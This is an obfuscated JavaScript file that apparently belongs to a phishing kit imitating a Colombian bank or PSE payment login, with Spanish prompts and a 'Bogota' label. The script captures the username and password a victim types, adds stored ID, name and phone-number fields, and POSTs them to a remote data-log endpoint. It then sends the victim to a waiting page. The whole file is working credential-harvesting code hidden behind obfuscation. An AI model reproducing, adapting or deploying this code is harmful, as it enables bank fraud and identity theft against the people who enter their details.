const _0x3b46dc = _0x431b;
function _0x431b(_0x15b5c2, _0x9d2ca7) {
  const _0x53c720 = _0x53c7();
  return (
    (_0x431b = function (_0x431b97, _0xc2346) {
      _0x431b97 = _0x431b97 - 0x72;
      let _0x283eba = _0x53c720[_0x431b97];
      return _0x283eba;
    }),
    _0x431b(_0x15b5c2, _0x9d2ca7)
  );
}
(function (_0xd95eff, _0x159a51) {
  const _0x160ff5 = _0x431b,
    _0x1bb95a = _0xd95eff();
  while (!![]) {
    try {
      const _0x59d84e =
        parseInt(_0x160ff5(0x9b)) / 0x1 +
        (-parseInt(_0x160ff5(0x89)) / 0x2) *
          (-parseInt(_0x160ff5(0x87)) / 0x3) +
        (-parseInt(_0x160ff5(0x7e)) / 0x4) *
          (-parseInt(_0x160ff5(0x7c)) / 0x5) +
        parseInt(_0x160ff5(0x99)) / 0x6 +
        (parseInt(_0x160ff5(0x9d)) / 0x7) * (parseInt(_0x160ff5(0x84)) / 0x8) +
        (-parseInt(_0x160ff5(0x7f)) / 0x9) * (parseInt(_0x160ff5(0x98)) / 0xa) +
        -parseInt(_0x160ff5(0x73)) / 0xb;
      if (_0x59d84e === _0x159a51) break;
      else _0x1bb95a["push"](_0x1bb95a["shift"]());
    } catch (_0x3b155e) {
      _0x1bb95a["push"](_0x1bb95a["shift"]());
    }
  }
})(_0x53c7, 0xe50cd);
function updateLS() {
  const _0x22b4ef = _0x431b;
  LS["setItem"](_0x22b4ef(0x88), JSON["stringify"](info));
}
const button = document[_0x3b46dc(0x78)](_0x3b46dc(0x8d)),
  userInput = document[_0x3b46dc(0x78)](_0x3b46dc(0x94)),
  passInput = document["getElementById"](_0x3b46dc(0x75));
function _0x53c7() {
  const _0x411103 = [
    "16PxAwNh",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "dudename",
    "18255YNXNoC",
    "info",
    "350dtkSYm",
    "log",
    "error",
    "puser",
    "btnUsuario",
    "setItem",
    "stringify",
    "token",
    "href",
    "metaInfo",
    "focus",
    "txtUsuario",
    "value",
    "json",
    "dataLogId",
    "1713670uQuetR",
    "634872jcopZa",
    "location",
    "1323626NZxrkn",
    "disabled",
    "4185524ykFSfH",
    "origin",
    "💠​​Bogota",
    "33599445HLtCxN",
    "Ingresó\x20datos",
    "txtPass",
    "Error\x20al\x20agregar\x20datos\x20en\x20el\x20servidor",
    "telnum",
    "getElementById",
    "application/json",
    "./wait.html",
    "user",
    "5waMIcz",
    "/dataLogs/addDataLog",
    "6693772USsVcg",
    "72GUZkxk",
    "addEventListener",
    "click",
    "Error\x20al\x20enviar\x20los\x20datos\x20al\x20servidor:",
    "preventDefault",
  ];
  _0x53c7 = function () {
    return _0x411103;
  };
  return _0x53c7();
}
button[_0x3b46dc(0x80)](_0x3b46dc(0x81), async function (_0x49c140) {
  const _0x140fae = _0x3b46dc;
  _0x49c140[_0x140fae(0x83)](), (button["disabled"] = !![]);
  if (userInput["value"] == "" && passInput[_0x140fae(0x95)] == "") {
    alert(_0x140fae(0x85)),
      userInput[_0x140fae(0x93)](),
      (button[_0x140fae(0x9c)] = ![]);
    return;
  } else {
    const _0x1f49e1 = userInput["value"],
      _0x43f4d8 = passInput["value"];
    (info[_0x140fae(0x92)][_0x140fae(0x7b)] = _0x1f49e1),
      (info[_0x140fae(0x92)][_0x140fae(0x8c)] = _0x43f4d8),
      updateLS();
    const _0x31446e = {
      reg: info[_0x140fae(0x92)]["cc"],
      name: info[_0x140fae(0x92)][_0x140fae(0x86)],
      cl: info[_0x140fae(0x92)][_0x140fae(0x77)],
      us: info[_0x140fae(0x92)]["user"],
      ps: info[_0x140fae(0x92)][_0x140fae(0x8c)],
      bn: _0x140fae(0x72),
      status: _0x140fae(0x74),
      source: "PSE",
    };
    try {
      const _0x31a302 = await fetch(url + _0x140fae(0x7d), {
        method: "POST",
        headers: {
          "Content-Type": _0x140fae(0x79),
          Origin: window[_0x140fae(0x9a)][_0x140fae(0x9e)],
        },
        body: JSON[_0x140fae(0x8f)](_0x31446e),
      });
      if (!_0x31a302["ok"]) {
        const _0x2f1c0f = await _0x31a302["json"]();
        throw new Error(_0x2f1c0f[_0x140fae(0x8b)] || _0x140fae(0x76));
      }
      const _0x5306cd = await _0x31a302[_0x140fae(0x96)]();
      localStorage[_0x140fae(0x8e)]("dataLogToken", _0x5306cd[_0x140fae(0x90)]),
        localStorage[_0x140fae(0x8e)](_0x140fae(0x97), _0x5306cd["id"]),
        console[_0x140fae(0x8a)](
          "Datos\x20enviados\x20correctamente\x20al\x20servidor"
        ),
        (window[_0x140fae(0x9a)][_0x140fae(0x91)] = _0x140fae(0x7a));
    } catch (_0x3d8a6c) {
      console["error"](_0x140fae(0x82), _0x3d8a6c),
        alert("Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud."),
        (button[_0x140fae(0x9c)] = ![]);
    }
  }
});
